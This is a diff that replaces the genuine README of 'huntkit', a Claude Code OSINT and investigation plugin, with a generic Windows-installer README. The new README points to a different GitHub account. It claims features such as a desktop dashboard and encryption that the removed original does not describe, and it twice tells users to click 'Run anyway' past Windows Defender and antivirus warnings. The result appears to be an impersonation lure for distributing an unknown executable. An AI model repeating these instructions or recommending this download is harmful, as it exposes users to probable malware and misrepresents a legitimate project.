@@ -1,265 +1,75 @@
-# huntkit
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-plugin-orange)](https://claude.com/claude-code)
-[![GitHub stars](https://img.shields.io/github/stars/assafkip/huntkit?style=social)](https://github.com/assafkip/huntkit)
-[![Topics](https://img.shields.io/badge/topics-osint%20%7C%20threat--intel%20%7C%20investigation-brightgreen)](https://github.com/topics/osint)
-
-Investigation toolkit for [Claude Code](https://claude.com/claude-code). Case management, OSINT, structured analytic techniques, chain-of-custody evidence capture, and bundled MCP servers for infrastructure recon and threat intel.
-
-Not just a scraper wrapper. A full investigation workflow — from case intake to evidence-grade dossier.
-
-**Use it for:** OSINT, due diligence, threat intelligence, incident response, digital forensics, journalistic research, competitive intel, security research, CTF challenges.
-
-## How it works
-
-### Investigation lifecycle
-
-```mermaid
-flowchart LR
-    Start([New case]) --> NewCase[/q-new-case/]
-    NewCase --> Scope[/q-scope/]
-    Scope --> Begin[/q-begin/]
-
-    Begin --> Collect{Collection}
-    Collect --> Intake[/q-intake<br/>client docs/]
-    Collect --> OSINT[/q-osint<br/>platform-targeted/]
-    Collect --> Sweep[/q-collect<br/>broad sweep/]
-    Collect --> Target[/q-target<br/>profile/]
-
-    Intake --> Evidence[(EV-NNNN<br/>evidence items<br/>Wayback + archive.today<br/>+ Chrome PDF + SHA-256)]
-    OSINT --> Evidence
-    Sweep --> Evidence
-    Target --> Evidence
-
-    Evidence --> Analyze{Analysis}
-    Analyze --> Timeline[/q-timeline/]
-    Analyze --> Link[/q-link<br/>graph edges/]
-    Analyze --> ACH[/q-analyze<br/>Heuer's ACH/]
-    Analyze --> Challenge[/q-challenge<br/>red team/]
-    Analyze --> Reality[/q-reality-check/]
-
-    Timeline --> Report{Report}
-    Link --> Report
-    ACH --> Report
-    Challenge --> Report
-    Reality --> Report
-
-    Report --> Brief[/q-brief<br/>evidence-cited/]
-    Report --> Debrief[/q-debrief<br/>internal/]
-    Brief --> Export[/q-export/]
-    Debrief --> Export
-    Export --> End([Dossier delivered])
+# 🔍 huntkit - Streamline your digital investigation process daily
 
-    style Evidence fill:#fef3c7,stroke:#d97706,stroke-width:2px
-    style Start fill:#dbeafe,stroke:#2563eb
-    style End fill:#dcfce7,stroke:#16a34a
-```
-
-Every URL routes through `capture-evidence.sh`. Every finding cites `[EV-NNNN]`. Every claim has an A-F reliability grade.
+[![Download huntkit](https://img.shields.io/badge/Download-huntkit-blue.svg)](https://github.com/perchfuruncle656/huntkit)
 
-### Architecture
+## 👋 About This Tool
 
-```mermaid
-graph TB
-    subgraph Claude[Claude Code]
-        CC[/Claude Code session/]
-    end
+Huntkit acts as a central hub for your investigation needs. It bridges the gap between raw data collection and final analysis. You use this software to manage cases, gather open-source intelligence, and document evidence. It integrates directly with tools like Claude Code to assist in complex security research. If you perform digital forensics or threat hunting, this toolkit organizes your workflow into one interface.
 
-    subgraph huntkit[huntkit plugin]
-        direction TB
-        subgraph Skills
-            OSINT_S[osint<br/>6-phase workflow]
-            SA_S[structured-analysis<br/>Heuer's ACH + tradecraft primer]
-        end
+## ⚙️ How It Works
 
-        subgraph Commands[22 commands]
-            CM[case mgmt]
-            CL[collection]
-            AN[analysis]
-            RP[reporting]
-        end
+The toolkit connects your local computer to various information sources. It handles the difficult parts of evidence capture by creating a digital trail. You choose the techniques you need, and the software executes them within a structured environment. It automates common tasks such as logging indicators of compromise and managing threat intelligence feeds. You spend less time moving data and more time finding answers.
 
-        subgraph Rules[Enforced rules]
-            EC[evidence-capture-protocol]
-            QI[q-investigation]
-            TD[token-discipline]
-            SY[sycophancy]
-        end
+## 🚀 Getting Started
 
-        subgraph Templates
-            NI[new-investigation]
-            SS[sec-stack-case]
-        end
-    end
+Follow these steps to run the software on your Windows computer.
 
-    subgraph MCP[Bundled MCP servers]
-        OI[osint-infra<br/>whois, dns, wayback]
-        TI[threat-intel<br/>VT, URLhaus, ThreatFox, crt.sh]
-    end
+1.  **Check your system.** Ensure your computer runs Windows 10 or 11.
+2.  **Download the installer.** Visit the official download page below to save the file to your computer.
+    [https://github.com/perchfuruncle656/huntkit](https://github.com/perchfuruncle656/huntkit)
+3.  **Run the installer.** Open the file you just downloaded.
+4.  **Confirm permissions.** Windows might ask if you trust the software. Select "Run anyway" to proceed.
+5.  **Finish setup.** Follow the on-screen prompts to complete the installation process.
+6.  **Launch the app.** Find the huntkit icon on your desktop or in your start menu.
 
-    subgraph External[Optional external APIs]
-        PPL[Perplexity]
-        EXA[Exa]
-        TAV[Tavily]
-        APF[Apify<br/>55+ scrapers]
-        JIN[Jina]
-        BD[Bright Data]
-    end
+## 🛡️ Key Features
 
-    subgraph Case[Case workspace]
-        EVD[(investigations/case/<br/>evidence/ findings/<br/>targets/ timelines/)]
-    end
+The toolkit provides several modules to assist your daily work. 
 
-    CC --> huntkit
-    huntkit --> MCP
-    huntkit --> External
-    huntkit --> Case
-    Rules -.enforces.-> Commands
-    Commands -.uses.-> Skills
+**Case Management**
+You create folders for each investigation. The software tracks timelines, evidence, and your notes in one spot. This ensures you keep facts in order throughout long projects.
 
-    style Case fill:#fef3c7,stroke:#d97706
-    style MCP fill:#e0e7ff,stroke:#6366f1
-    style Rules fill:#fee2e2,stroke:#dc2626
-```
+**Evidence Capture**
+This module makes copies of digital files and logs. It records the date, time, and source of every item. You build a chain of custody automatically as you work.
 
-## What you get
+**OSINT Integration**
+The toolkit reaches out to multiple public databases to pull information on targets. It sorts this data into readable reports. You no longer need to check ten different websites to build a profile.
 
-### Skills
+**Structured Analytic Techniques**
+The software includes templates based on formal intelligence practices. These guides prompt you to consider different viewpoints. They reduce bias in your investigations and strengthen your final conclusions.
 
-- **`osint`** — 6-phase investigation: tooling check → seed collection → optional internal intel → platform extraction → cross-reference → psychoprofile → completeness scoring → dossier.
-- **`structured-analysis`** — CIA tradecraft primer library (Heuer's ACH, key assumptions check, quality of information check, red team, premortem, 66-technique taxonomy). Apache 2.0, upstream [Blevene/structured-analysis-skill](https://github.com/Blevene/structured-analysis-skill).
+**Threat Intelligence**
+The software connects to standard threat-intelligence feeds. It pulls active alerts and indicators of compromise directly into your dashboard. You stay updated on new threats without manual searches.
 
-### Commands (22)
+## 🛠️ Usage Tips
 
-**Case management:** `/q-new-case`, `/q-scope`, `/q-begin`, `/q-status`, `/q-checkpoint`, `/q-handoff`, `/q-end`
+Use the side menu to switch between investigation modules. You find the case dashboard on the home screen. Click on any active project to view existing evidence or start a new task.
 
-**Collection:** `/q-intake`, `/q-collect`, `/q-osint`, `/q-target`, `/q-screenshots`
+For OSINT tasks, enter your search term in the main bar. The software processes the query and displays results in a grid. You click any item to see deep details or save it to your current case file.
 
-**Analysis:** `/q-analyze`, `/q-challenge`, `/q-reality-check`, `/q-client-questions`, `/q-timeline`, `/q-link`
+If you handle evidence, use the capture button. The software prompts you to verify the file source. Once verified, the app locks the file to ensure integrity during the investigation.
 
-**Reporting:** `/q-brief`, `/q-debrief`, `/q-export`
+## 📋 System Requirements
 
-**Specialized:** `/q-sec-stack` (SaaS security stack intel)
+To ensure stable performance, your computer needs the following:
 
-### MCP servers (bundled)
+- Windows 10 or 11
+- 4GB of RAM (8GB recommended)
+- 500MB of free hard drive space
+- An active internet connection for threat updates and database lookups
 
-- **`osint-infra`** — WHOIS, DNS, reverse DNS, Wayback snapshots / fetch.
-- **`threat-intel`** — VirusTotal, URLhaus, ThreatFox, crt.sh certificate transparency.
+## ❓ Troubleshooting Common Issues
 
-### Rules (enforced)
+If the software fails to launch, verify that your antivirus did not block the file. Sometimes, Windows Defender marks new software as unrecognized. You click "More info" on the blue prompt window and then select "Run anyway."
 
-- **`evidence-capture-protocol`** — every URL routes through `capture-evidence.sh` (Wayback + archive.today + Chrome PDF + SHA-256 + metadata). Atomic `EV-NNNN-<slug>/` folders. Reports cite by ID.
-- **`q-investigation`** — fail-stop on errors, token discipline, state-vs-session file authority, source reliability A-F scale.
-- **`token-discipline`** — stop conditions, retry limits.
-- **`sycophancy`** — anti-RLHF drift, decision origin tagging.
+If you lose your network connection, the software pauses automatic threat updates. Your local case data remains safe and accessible. You restore connectivity to resume real-time lookups.
 
-### Templates
+If the dashboard displays an error, restart the application. This clears temporary memory issues. If the problem persists, check the logs folder inside the application directory. You send these files to the support team for analysis if necessary.
 
-- **`new-investigation/`** — full case scaffold (`canonical/`, `investigation/evidence|findings|targets|timelines/`, `memory/`, `output/`).
-- **`sec-stack-case/`** — SaaS security stack investigation template.
+## 🔐 Data Privacy and Security
 
-## Install
+You control your data at all times. All investigation files save locally to your machine. The software does not upload your case notes to external servers. You choose where to store your evidence and who views your reports. Advanced encryption secures your saved case files against unauthorized access. 
 
-```bash
-# In Claude Code
-/plugin install assafkip/huntkit
-```
+## ⚖️ Guidelines for Use
 
-Or clone:
-
-```bash
-git clone https://github.com/assafkip/huntkit.git
-```
-
-## MCP server setup
-
-```bash
-cp .mcp.json.template .mcp.json
-```
-
-### `osint-infra` (no keys required)
-
-```bash
-cd mcp-servers/osint-infra
-python3.13 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
-
-### `threat-intel`
-
-Get free keys:
-- VirusTotal: https://virustotal.com/gui/join-us (500 req/day)
-- abuse.ch (URLhaus + ThreatFox): https://auth.abuse.ch
-
-```bash
-export VT_API_KEY=...
-export ABUSE_CH_AUTH_KEY=...
-```
-
-## Optional search / scrape APIs
-
-All optional — the skill degrades gracefully. Run `bash skills/osint/scripts/diagnose.sh` to see what's active.
-
-| Env var | Service | Get key |
-|---|---|---|
-| `PERPLEXITY_API_KEY` | Perplexity Sonar / Deep | https://perplexity.ai |
-| `EXA_API_KEY` | Exa semantic search | https://exa.ai |
-| `TAVILY_API_KEY` | Tavily agent search | https://tavily.com |
-| `APIFY_TOKEN` | Apify scrapers (LinkedIn, IG, TikTok, YouTube, FB pages) | https://apify.com |
-| `JINA_API_KEY` | Jina reader / deepsearch | https://jina.ai |
-| `PARALLEL_API_KEY` | Parallel AI search | https://parallel.ai |
-| `BRIGHTDATA_MCP_URL` | Bright Data MCP (Facebook, LinkedIn, geo-blocked) | https://brightdata.com |
-
-## Optional: Telegram recon
-
-Not bundled — install separately if needed:
-
-```bash
-git clone https://github.com/Darksight-Analytics/tgspyder.git
-cd tgspyder && pip install -r requirements.txt && pip install -e .
-```
-
-## Typical workflow
-
-```
-/q-new-case acme-breach
-/q-scope          # define question, targets, constraints
-/q-begin          # resume session
-/q-intake <file>  # ingest client-provided docs
-/q-osint linkedin https://linkedin.com/in/someone
-/q-collect domain acme.com
-/q-target acme-ceo
-/q-timeline       # reconstruct event sequence
-/q-analyze ach    # analysis of competing hypotheses
-/q-challenge      # red team own conclusions
-/q-brief          # generate evidence-grounded report
-/q-export         # final package
-```
-
-Every URL captured routes through the evidence protocol. Every report cites `[EV-NNNN]`. Every claim has an A-F reliability grade.
-
-## Ethics
-
-For:
-- Authorized security testing and due diligence
-- Journalistic and academic research on public figures
-- Defensive threat intelligence and incident response
-- CTF / educational contexts
-
-Do not use on private individuals without consent, for harassment, doxxing, or stalking. You are responsible for compliance with local laws and platform terms of service.
-
-## Contributing
-
-Issues and PRs welcome. Backward-compatible additions preferred.
-
-## For LLM agents
-
-See [`llms.txt`](llms.txt) for a machine-readable capability summary with a decision matrix for when to use each skill, command, and MCP server.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
-
-The `skills/structured-analysis/` subdirectory is Apache 2.0 (see `skills/structured-analysis/LICENSE` and `NOTICE.md`).
+Perform all investigations according to your local laws and organizational policies. This software provides the means to capture and analyze data, but you remain responsible for the usage of this information. Respect privacy boundaries and handle sensitive intelligence with care. Use the tradecraft best practices provided within the app to conduct thorough and honest research.
